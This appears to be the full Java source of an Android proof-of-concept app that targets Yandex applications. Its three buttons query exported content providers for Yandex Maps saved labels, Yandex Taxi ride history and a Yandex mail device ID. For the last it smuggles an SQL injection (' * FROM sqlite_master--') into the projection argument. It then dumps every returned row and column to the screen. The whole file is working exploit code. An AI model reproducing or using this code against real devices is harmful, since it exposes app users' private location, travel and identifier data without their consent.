package ru.drakonoid.yapoc;

import java.util.ArrayList;
import java.util.Iterator;

import android.net.Uri;
import android.os.Bundle;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.ContentResolver;
import android.database.Cursor;
import android.util.Base64;
import android.view.Menu;
import android.view.View;

public class MainActivity extends Activity {
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

	public static ArrayList<String> getColumns (ContentResolver resolver, String uri, String[] projectionArray)
	{
		ArrayList<String> columns = new ArrayList<String>();	
		try
		{				
	        Cursor c = resolver.query(Uri.parse(uri), projectionArray, null, null, null);
	        if (c != null)
	        {
	        	String [] colNames = c.getColumnNames();
	        	c.close();
	        	for (int k = 0; k < colNames.length; k++)
	        		columns.add(colNames[k]);
	        }
		}
		catch (Throwable t) {}
		return columns;
	}
    
	public String make_shoot(String target, String projection) {
		
		ContentResolver r = getContentResolver();
		String[] projectionArray = null;
		if (projection.length() > 0) {
			projectionArray = new String[1];
			int i = 0;
			projectionArray[i] = projection;
		}

		String data = "";
		Cursor c = r.query(Uri.parse(target), projectionArray, null, null, null);
		if (c != null) {
			ArrayList<String> cols = getColumns(r,
					target,
					projectionArray);
			Iterator<String> it = cols.iterator();
			String columns = "";

			while (it.hasNext())
				columns += it.next() + " | ";

			data += columns.substring(0, columns.length() - 3);
			data += "\n\n";
			for (c.moveToFirst(); !c.isAfterLast(); c.moveToNext())	{
				int numOfColumns = c.getColumnCount();

				for (int l = 0; l < numOfColumns; l++) {
					try	{
						data += c.getString(l);
					}
					catch (Exception e)	{
						data += "(blob) "
								+ Base64.encodeToString(c.getBlob(l),
										Base64.DEFAULT);
					}

					if (l != (numOfColumns - 1))
						data += " | ";
				}
			}
		}
		
		return data;
	}
    
    public void onClick(View v) {
    	String vuln_content = "", type_bullet = "", profit;
    	switch (v.getId()) {
    	    case R.id.button1:
    	    	vuln_content = "content://ru.yandex.yandexmaps.labels.LabelsProvider/mylabels";
    	        break;
    	    case R.id.button2:
    	    	vuln_content = "content://ru.yandex.taxi/history";
    	        break;
    	    case R.id.button3:
    	    	vuln_content = "content://ru.yandex.device.id.mail/device_id";
    	    	type_bullet = " * FROM sqlite_master--";
    	        break;
    	    	
        }
 
    	profit = make_shoot(vuln_content, type_bullet);
        AlertDialog.Builder dlgAlert  = new AlertDialog.Builder(this);

        dlgAlert.setMessage(profit);
        dlgAlert.setTitle("Data from BD");
        dlgAlert.setPositiveButton("OK", null);
        dlgAlert.setCancelable(true);
        dlgAlert.create().show();

        return;
    }
    
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }
}
